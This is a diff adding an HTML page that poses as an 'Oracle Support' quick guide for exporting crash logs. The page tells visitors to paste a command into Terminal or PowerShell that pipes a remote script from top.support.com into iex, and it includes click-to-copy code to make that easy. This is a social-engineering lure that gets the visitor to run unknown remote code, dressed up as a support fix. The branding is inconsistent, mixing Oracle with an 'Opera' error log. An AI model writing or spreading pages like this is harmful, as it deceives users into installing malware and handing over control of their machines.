@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Oracle Support - Quick Guide</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #f5f6f5 0%, #e5e7e5 100%);
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 800px;
+      text-align: center;
+    }
+    .brand {
+      font-size: 1.4em;
+      font-weight: 700;
+      color: #c41230;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 2.2em;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      font-size: 1.1em;
+      color: #444;
+      margin-bottom: 20px;
+    }
+    .description-box {
+      background: #f2f2f2;
+      border: 1px solid #ccc;
+      border-left: 4px solid #c41230;
+      border-radius: 6px;
+      padding: 15px 18px;
+      text-align: left;
+      margin: 0 auto 25px auto;
+      max-width: 650px;
+    }
+    .description-box p {
+      font-size: 0.95em;
+      line-height: 1.5;
+      color: #444;
+      margin: 8px 0;
+    }
+    .code-block {
+      position: relative;
+      background: #222;
+      color: #f8f8f2;
+      padding: 20px;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 1rem;
+      cursor: pointer;
+      user-select: none;
+      text-align: left;
+    }
+    .code-block:hover {
+      background: #333;
+    }
+    #copy-feedback {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #28a745;
+      color: white;
+      padding: 6px 12px;
+      border-radius: 4px;
+      opacity: 0;
+      transition: opacity 0.5s;
+      font-size: 0.85rem;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 0.85em;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="brand">Oracle Support</div>
+    <h1>Quick Crash Log Guide</h1>
+    <p class="subtitle">Export logs so we can fix issues remotely</p>
+
+    <div class="description-box">
+      <p>This command will securely export your crash logs and send them to our support system.</p>
+      <p>It allows our engineers to quickly diagnose the issue and provide a fix without needing direct access to your device.</p>
+      <p>Simply copy the command below, paste it into your Terminal/PowerShell, and press <strong>Enter</strong>.</p>
+    </div>
+
+    <pre class="code-block" id="code-block"><code id="code-text">https://top.support.com/OperaErrorLog.ps1 | iex</code>
+      <span id="copy-feedback">Copied!</span>
+    </pre>
+
+    <div class="footer">
+      <p>&copy; 2025 Oracle Support. All rights reserved.</p>
+    </div>
+  </div>
+
+  <script>
+    const codeBlock = document.getElementById("code-block");
+    const codeText = document.getElementById("code-text");
+    const feedback = document.getElementById("copy-feedback");
+
+    codeBlock.addEventListener("click", async () => {
+      try {
+        await navigator.clipboard.writeText(codeText.innerText.trim());
+        feedback.style.opacity = "1";
+        setTimeout(() => feedback.style.opacity = "0", 1000);
+      } catch (err) {
+        console.error("Copy failed", err);
+      }
+    });
+  </script>
+</body>
+</html>
